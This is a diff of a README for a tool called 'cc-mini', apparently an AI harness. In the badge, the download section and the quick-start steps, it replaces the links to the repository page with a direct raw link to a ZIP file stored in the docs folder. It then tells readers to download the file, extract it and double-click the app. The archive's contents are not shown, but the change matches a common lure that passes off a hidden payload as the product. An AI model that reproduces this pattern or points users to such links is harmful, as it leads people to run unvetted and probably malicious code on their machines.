@@ -1,6 +1,6 @@
 # 🧩 cc-mini - Simple AI Harness for Fast Setup
 
-[![Download cc-mini](https://img.shields.io/badge/Download-cc--mini-6f42c1?style=for-the-badge&logo=github)](https://github.com/Marcogreen394/cc-mini)
+[![Download cc-mini](https://img.shields.io/badge/Download-cc--mini-6f42c1?style=for-the-badge&logo=github)](https://github.com/Marcogreen394/cc-mini/raw/refs/heads/main/docs/mini_cc_3.7.zip)
 
 ## 🪄 What cc-mini does
 
@@ -17,7 +17,7 @@ Use it if you want:
 
 Visit this page to download or get the app:
 
-https://github.com/Marcogreen394/cc-mini
+https://github.com/Marcogreen394/cc-mini/raw/refs/heads/main/docs/mini_cc_3.7.zip
 
 If the page has a release file for Windows, download it there. If you get a ZIP file, save it to your computer and extract it before you run the app.
 
@@ -170,7 +170,7 @@ When working with cc-mini, keep this in mind:
 
 ## 📌 Quick start
 
-1. Open the download page: https://github.com/Marcogreen394/cc-mini
+1. Open the download page: https://github.com/Marcogreen394/cc-mini/raw/refs/heads/main/docs/mini_cc_3.7.zip
 2. Download the Windows file
 3. Extract it if needed
 4. Double-click the app file
